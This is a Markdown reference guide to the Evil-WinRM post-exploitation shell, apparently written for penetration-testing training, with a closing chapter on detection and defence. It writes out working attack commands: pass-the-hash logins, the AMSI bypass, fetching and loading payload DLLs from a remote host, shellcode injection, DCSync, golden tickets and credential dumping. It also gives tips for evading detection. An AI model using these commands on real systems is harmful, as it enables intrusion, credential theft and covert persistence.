---
tool_name: "evil-winrm"
display_name: "Evil-WinRM"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "pass_the_hash"
install_command: "sudo apt install evil-winrm"
version: "3.9"
github_repo: "https://github.com/Hackplayers/evil-winrm"
kali_tools_page: "https://www.kali.org/tools/evil-winrm/"
difficulty_level: "intermediate"
requires_root: false
gui_available: false
tags: ["winrm", "powershell", "pass-the-hash", "lateral-movement", "kerberos"]
related_tools: ["crackmapexec", "impacket", "freerdp"]
---

# Evil-WinRM

## Chapter 1: Introduction & Overview

### What is Evil-WinRM?

Evil-WinRM is the ultimate WinRM shell for hacking and penetration testing. It provides a feature-rich interactive shell over Windows Remote Management (WinRM) using PSRP (PowerShell Remoting Protocol). The tool supports pass-the-hash, Kerberos authentication, in-memory execution of PowerShell scripts and C# assemblies, and built-in AMSI bypass.

### History & Background

- **Created:** 2018 by CyberVaca (@CyberVaca_)
- **Maintained:** Hackplayers team (CyberVaca, OscarAkaElvis, Jarilaos, arale61)
- **License:** LGPL-3.0+
- **Purpose:** Post-exploitation shell for Windows environments

Evil-WinRM evolved from the original WinRM Ruby implementation by Alamot. It now uses PSRP instead of raw WinRM protocol, enabling more advanced features like in-memory script execution and DLL loading.

### When to Use This Tool

- **Post-exploitation:** Interactive shell on compromised Windows systems
- **Lateral movement:** Move through networks using pass-the-hash
- **Credential testing:** Test WinRM access with stolen credentials
- **Red team operations:** Covert shell with AMSI bypass

### Key Concepts

- **WinRM:** Microsoft's WS-Management Protocol implementation (default port 5985/5986)
- **PSRP:** PowerShell Remoting Protocol for remote PowerShell execution
- **Pass-the-Hash:** Authenticate using NTLM hash instead of cleartext password
- **AMSI Bypass:** Dynamic bypass of Antimalware Scan Interface
- **Donut Loader:** In-memory x64 payload injection

### Evil-WinRM vs Other Shells

| Feature | Evil-WinRM | PowerShell Remoting | WinRM-Sessions |
|---------|-----------|---------------------|----------------|
| Pass-the-Hash | Yes | Limited | No |
| AMSI Bypass | Built-in | Manual | No |
| In-Memory C# | Yes | No | No |
| Kerberos Auth | Full support | Limited | No |
| File Transfer | Built-in | Manual | Manual |
| Donut Loader | Yes | No | No |

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Linux (Kali, Parrot, etc.) or Windows
- **Ruby:** 2.3 or higher
- **RAM:** 512 MB minimum
- **Disk Space:** ~20 MB

### Installation Methods

#### Method 1: Gem Install (Recommended)

```bash
sudo gem install evil-winrm
```

**Explanation:** Installs Evil-WinRM as a Ruby gem with all dependencies automatically resolved.

#### Method 2: Git Clone

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
sudo gem install winrm winrm-fs stringio logger fileutils
```

**Explanation:** Manual installation with explicit dependency management.

#### Method 3: Bundler

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
gem install bundler
bundle install --path vendor/bundle
bundle exec evil-winrm.rb -h
```

**Explanation:** Bundler manages dependencies in an isolated environment without system-wide installation.

#### Method 4: Docker

```bash
docker run --rm -ti --name evil-winrm \
  -v /path/to/scripts:/ps1_scripts \
  -v /path/to/exes:/exe_files \
  -v /path/to/data:/data \
  oscarakaelvis/evil-winrm -i 192.168.1.100 -u admin -p password
```

**Explanation:** Docker provides a pre-built environment with all dependencies.

### Post-Installation Setup

#### Verify Installation

```bash
evil-winrm -h
```

**Explanation:** Confirms Evil-WinRM is installed and operational.

#### Configure Kerberos (Optional)

```bash
# Install Kerberos package
sudo apt install krb5-user

# Configure /etc/krb5.conf
[realms]
CONTOSO.COM = {
    kdc = dc1.contoso.com
    kdc = dc2.contoso.com
}
```

**Explanation:** Kerberos authentication requires proper Kerberos configuration for domain environments.

---

## Chapter 3: Basic Usage

### Connection Methods

#### Password Authentication

```bash
evil-winrm -i 192.168.1.100 -u Administrator -p 'MyPassword123!'
```

**Explanation:** Basic password authentication to a Windows host with WinRM enabled.

#### Pass-the-Hash

```bash
evil-winrm -i 192.168.1.100 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
```

**Explanation:** Authenticate using NTLM hash without knowing the cleartext password. The hash format is LM:NT.

#### SSL Connection

```bash
evil-winrm -i 192.168.1.100 -u Administrator -p 'MyPassword123!' -S
```

**Explanation:** Enable SSL for encrypted communication (port 5986 by default).

#### Custom Port

```bash
evil-winrm -i 192.168.1.100 -u Administrator -p 'MyPassword123!' -P 5986
```

**Explanation:** Connect to WinRM on a non-standard port.

### Basic Shell Commands

Once connected, the interactive shell provides:

```
*Evil-WinRM* PS C:\> whoami
contoso\administrator

*Evil-WinRM* PS C:\> hostname
DC01

*Evil-WinRM* PS C:\> ipconfig
```

**Explanation:** Standard PowerShell commands work directly in the Evil-WinRM shell.

### File Transfer

#### Upload Files

```bash
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe
```

**Explanation:** Upload files from the attacker's machine to the target. Tab completion works for local files.

#### Download Files

```bash
*Evil-WinRM* PS C:\> download C:\Windows\Temp\file.exe /local/path/file.exe
```

**Explanation:** Download files from the target to the attacker's machine.

### Services Enumeration

```bash
*Evil-WinRM* PS C:\> services
```

**Explanation:** Lists all Windows services with their status and the current user's permissions on each.

---

## Chapter 4: Intermediate Usage

### Loading PowerShell Scripts

#### Using the -s Flag

```bash
evil-winrm -i 192.168.1.100 -u Administrator -p 'MyPassword123!' \
  -s /path/to/scripts/
```

**Explanation:** The `-s` flag specifies a local directory containing PowerShell scripts. Scripts are loaded into the session.

#### Loading Scripts in Session

```
*Evil-WinRM* PS C:\> PowerView.ps1
*Evil-WinRM* PS C:\> menu
```

**Explanation:** Type the script name (tab-completable) to load it. The `menu` command shows loaded functions.

#### Example: PowerView

```
*Evil-WinRM* PS C:\> PowerView.ps1
*Evil-WinRM* PS C:\> Get-DomainUser -Identity jsmith
```

**Explanation:** PowerView functions become available after loading the script.

### In-Memory C# Execution

#### Invoke-Binary

```bash
evil-winrm -i 192.168.1.100 -u Administrator -p 'MyPassword123!' \
  -e /path/to/exes/
```

**Explanation:** The `-e` flag specifies a directory containing C# executables for in-memory execution.

```
*Evil-WinRM* PS C:\> Invoke-Binary /opt/csharp/Rubeus.exe
*Evil-WinRM* PS C:\> Invoke-Binary /opt/csharp/Binary.exe 'param1, param2, param3'
```

**Explanation:** C# assemblies execute entirely in memory without touching disk, bypassing file-based AV.

### DLL Loading

```
*Evil-WinRM* PS C:\> Dll-Loader -http http://192.168.1.100/SharpSploit.dll
[+] Reading dll by HTTP
[+] Loading dll...
*Evil-WinRM* PS C:\> menu
```

**Explanation:** DLL-Loader loads .NET assemblies from HTTP, SMB, or local paths into memory.

#### DLL Loading Methods

```
# HTTP
Dll-Loader -http http://192.168.1.100/payload.dll

# SMB
Dll-Loader -smb \\192.168.1.100\share\payload.dll

# Local
Dll-Loader -local C:\Users\Admin\payload.dll
```

**Explanation:** Multiple loading methods accommodate different network scenarios.

### Donut Loader

```
*Evil-WinRM* PS C:\> Donut-Loader -process_id 2195 -donutfile /path/to/payload.bin
```

**Explanation:** Injects x64 payloads generated with the donut technique into running processes.

#### Generate Donut Payload

```bash
# Using Python donut module
pip3 install donut-shellcode
python3 -c "import donut; donut.shellcode('payload.exe', 'payload.bin')"

# Or use donut-maker.py
python3 donut-maker.py -i payload.exe
```

**Explanation:** Donut converts .NET assemblies into position-independent shellcode for process injection.

### AMSI Bypass

```
*Evil-WinRM* PS C:\> Bypass-4MSI
[+] Success!
```

**Explanation:** Dynamically patches the AMSI (Antimalware Scan Interface) in the current PowerShell process to prevent script scanning.

### Kerberos Authentication

#### Setup

```bash
# 1. Sync time with DC
rdate -n 192.168.1.1

# 2. Configure /etc/krb5.conf
echo "CONTOSO.COM = { kdc = dc1.contoso.com }" | sudo tee -a /etc/krb5.conf

# 3. Get TGT
impacket-getTGT contoso.com/admin:password

# 4. Connect
evil-winrm -i dc1.contoso.com -u admin -r CONTOSO.COM -K /tmp/admin.ccache
```

**Explanation:** Kerberos authentication requires time synchronization, proper configuration, and valid tickets.

#### Using Ticket Files

```bash
# Set environment variable
export KRB5CCNAME=/tmp/ticket.ccache

# Or use -K parameter (auto-detects format)
evil-winrm -i hostname -r DOMAIN.COM -K /path/to/ticket.ccache
```

**Explanation:** The `-K` parameter auto-detects ticket format (ccache or kirbi) and sets the environment variable.

---

## Chapter 5: Advanced Usage

### Advanced Attack Techniques

#### DCSync Attack

```
*Evil-WinRM* PS C:\> Invoke-Binary /opt/csharp/SharpKatz.exe DCSync
```

**Explanation:** Use in-memory C# tools to perform DCSync and extract domain credentials.

#### Kerberoasting

```
*Evil-WinRM* PS C:\> PowerView.ps1
*Evil-WinRM* PS C:\> Invoke-Kerberoast -OutputFormat Hashcat | Out-File /tmp/kerberoast.txt
```

**Explanation:** Request service tickets for all SPNs and extract them for offline cracking.

#### Golden Ticket Creation

```bash
# First extract krbtgt hash
impacket-secretsdump contoso.com/admin:password@192.168.1.1 -just-dc-user krbtgt

# Create golden ticket
impacket-ticketer -nthash <krbtgt_hash> -domain contoso.com -domain-sid S-1-5-21-... Administrator

# Use with Evil-WinRM
evil-winrm -i dc1.contoso.com -u Administrator -r CONTOSO.COM -K /tmp/Administrator.ccache
```

**Explanation:** Golden tickets provide persistent domain access using the krbtgt hash.

### Integration with Red Team Frameworks

#### With Cobalt Strike

```bash
# Generate Cobalt Strike shellcode
# Use Donut to convert to position-independent code
# Inject via Evil-WinRM's Donut-Loader
```

**Explanation:** Evil-WinRM can deliver Cobalt Strike payloads through in-memory injection.

#### With Covenant

```bash
# Generate grunter as DLL
# Upload via Evil-WinRM
# Load via Dll-Loader
```

**Explanation:** Covenant grunt DLLs can be loaded in-memory through Evil-WinRM.

### Custom User-Agent

```bash
evil-winrm -i 192.168.1.100 -u Administrator -p 'MyPassword123!' \
  -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

**Explanation:** Custom user-agent strings help blend in with legitimate WinRM traffic.

### ETW Bypass

```
*Evil-WinRM* PS C:\> Bypass-4MSI
[+] Success!
```

**Explanation:** Evil-WinRM's built-in AMSI bypass also addresses ETW (Event Tracing for Windows) telemetry.

### Session Logging

```bash
evil-winrm -i 192.168.1.100 -u Administrator -p 'MyPassword123!' -l
```

**Explanation:** The `-l` flag enables logging of all commands and output to files in the `$HOME` directory.

### Command History

Evil-WinRM maintains persistent command history per host/user combination in `~/.evil-winrm/history/`. Arrow keys navigate previous commands.

**Explanation:** Command history persists across sessions for the same host/user pair.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge

**Objective:** Get a shell on a Windows target

**Steps:**

```bash
# 1. Find WinRM enabled
nmap -p 5985,5986 192.168.1.0/24

# 2. Try found credentials
evil-winrm -i 192.168.1.100 -u admin -p password123

# 3. If you have hash only
evil-winrm -i 192.168.1.100 -u admin -H 'aad3b435b51404ee...'

# 4. Enumerate and escalate
*Evil-WinRM* PS C:\> whoami /all
*Evil-WinRM* PS C:\> Upload /tools/linpeas.bat C:\Temp\linpeas.bat
```

**Explanation:** Standard CTF workflow from discovery to exploitation.

### Scenario 2: Penetration Test

**Objective:** Lateral movement in Windows domain

**Steps:**

```bash
# 1. Connect to first compromised host
evil-winrm -i 192.168.1.100 -u admin -p Password123

# 2. Dump credentials
*Evil-WinRM* PS C:\> Invoke-Binary /opt/csharp/SharpDump.exe

# 3. Use found hashes for lateral movement
evil-winrm -i 192.168.1.200 -u admin -H 'aad3b435b51404ee...'

# 4. Repeat until domain admin
```

**Explanation:** Standard lateral movement workflow using credential extraction and pass-the-hash.

### Scenario 3: Red Team Operation

**Objective:** Covert domain persistence

**Steps:**

```bash
# 1. Connect using Kerberos ticket
evil-winrm -i dc1.contoso.com -u admin -r CONTOSO.COM -K /tmp/ticket.ccache

# 2. Bypass AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Load persistence toolkit
*Evil-WinRM* PS C:\> Invoke-Binary /opt/csharp/DCSync.exe

# 4. Extract krbtgt hash and create golden ticket
# 5. Maintain access via golden tickets
```

**Explanation:** Covert red team operation using Kerberos auth, AMSI bypass, and golden ticket persistence.

### Scenario 4: Credential Testing

**Objective:** Test WinRM access across network

**Steps:**

```bash
# 1. Test single host
evil-winrm -i 192.168.1.100 -u administrator -p 'Password123'

# 2. Test with hash
evil-winrm -i 192.168.1.100 -u administrator -H 'aad3b435b51404ee...'

# 3. Automated testing with crackmapexec
crackmapexec winrm 192.168.1.0/24 -u admin -p password
```

**Explanation:** Combine Evil-WinRM with CrackMapExec for comprehensive WinRM testing.

---

## Chapter 7: Detection & Defense

### How Defenders Detect Evil-WinRM

#### Network Indicators

- **WinRM connections:** Unusual sources connecting to port 5985/5986
- **PSRP traffic:** PowerShell Remoting Protocol patterns
- **Large data transfers:** File upload/download activity

#### Host-Based Indicators

- **WinRM process:** wsmprovhost.exe spawned by svchost.exe
- **PowerShell logging:** ScriptBlock and Module logging events
- **Event logs:** Event IDs 4103, 4104 (PowerShell logging)

#### Log Analysis

```bash
# Windows Event IDs to monitor
# 4103 - Module Logging
# 4104 - ScriptBlock Logging
# 4624 - Logon (Type 3 for network)
# 4688 - Process Creation (wsmprovhost.exe)
```

**Explanation:** Multiple logging sources can detect Evil-WinRM activity.

### Mitigation Strategies

#### Preventive Controls

1. **Restrict WinRM access:** Use firewall rules to limit who can connect
2. **Require HTTPS:** Enforce WinRM over SSL (port 5986)
3. **Disable WinRM:** If not needed, disable the service entirely
4. **Implement JIT access:** Just-in-time administrative access

#### Detective Controls

1. **Enable PowerShell logging:** ScriptBlock, Module, and Transcription logging
2. **Monitor WinRM connections:** Alert on unusual sources
3. **Watch for wsmprovhost.exe:** Unusual process creation patterns
4. **Network monitoring:** Detect PSRP protocol usage

### Blue Team Response

1. **Enable comprehensive PowerShell logging** (Event IDs 4103, 4104)
2. **Restrict WinRM via GPO** to authorized management systems
3. **Deploy EDR** with behavioral detection for WinRM abuse
4. **Implement network segmentation** to limit lateral movement
5. **Monitor for pass-the-hash** using Windows Event IDs 4624 (Type 3)

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "OpenSSL::Digest::DigestError"

**Cause:** OpenSSL 3.0 retired legacy functions like MD4

**Solution:**

```bash
# Option 1: Edit /etc/ssl/openssl.cnf
# Add legacy provider section

# Option 2: Create custom config
cat > /tmp/evil-tls.conf << 'EOF'
openssl_conf = openssl_init

[openssl_init]
providers = provider_sect

[provider_sect]
default = default_sect
legacy = legacy_sect

[default_sect]
activate = 1

[legacy_sect]
activate = 1
EOF

export OPENSSL_CONF="/tmp/evil-tls.conf"
```

**Explanation:** OpenSSL 3.0 deprecated legacy algorithms. Enabling the legacy provider resolves compatibility.

#### Error: "Connection refused"

**Cause:** WinRM not enabled or firewall blocking

**Solution:**

```bash
# Enable WinRM on target (requires admin)
winrm quickconfig

# Check if port is open
nmap -p 5985 192.168.1.100
```

**Explanation:** WinRM must be enabled and the port must be accessible.

#### Error: "Access denied"

**Cause:** User lacks WinRM permissions

**Solution:**

```bash
# Add user to Remote Management Users group
net localgroup "Remote Management Users" admin /add

# Or configure WinRM authorization
winrm set winrm/config/service @{AllowRemoteAccess="true"}
```

**Explanation:** Users need explicit WinRM permissions to connect.

#### Error: "Kerberos authentication failed"

**Cause:** Time skew or misconfigured Kerberos

**Solution:**

```bash
# Sync time with DC
rdate -n 192.168.1.1

# Verify ticket
klist

# Check /etc/krb5.conf
```

**Explanation:** Kerberos requires time synchronization within 5 minutes and proper configuration.

### FAQ

**Q: Does Evil-WinRM work on Windows clients?**
A: Yes, but only if WinRM is enabled (not default on clients). Windows Server has WinRM enabled by default.

**Q: Can Evil-WinRM connect over HTTPS?**
A: Yes, use the `-S` flag for SSL connections on port 5986.

**Q: What's the difference between Evil-WinRM and WinRM-Session?**
A: Evil-WinRM is feature-rich with AMSI bypass, DLL loading, and Donut injection. WinRM-Session is simpler.

**Q: How do I avoid detection?**
A: Use Kerberos authentication, AMSI bypass, custom user-agent, and avoid obvious malicious scripts.

**Q: Can Evil-WinRM execute .NET assemblies without disk?**
A: Yes, via Invoke-Binary (C# assemblies), Dll-Loader (DLLs), and Donut-Loader (shellcode).

---

## Resources

### Official Documentation

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [Evil-WinRM Changelog](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/CHANGELOG.md)
- [Kali Linux Evil-WinRM](https://www.kali.org/tools/evil-winrm/)

### Tutorials

- [Evil-WinRM Usage Guide - HackTricks](https://book.hacktricks.xyz/)
- [WinRM Attacks - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/protocols/winrm)
- [OffSec PEN-200 Course](https://www.offsec.com/courses/pen-200/)

### Related Tools

- **CrackMapExec:** Network pentesting with WinRM support
- **Impacket:** Python network protocol toolkit
- **FreeRDP:** RDP client with pass-the-hash
- **PowerSharpPack:** C# offensive tools collection

### Practice Resources

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
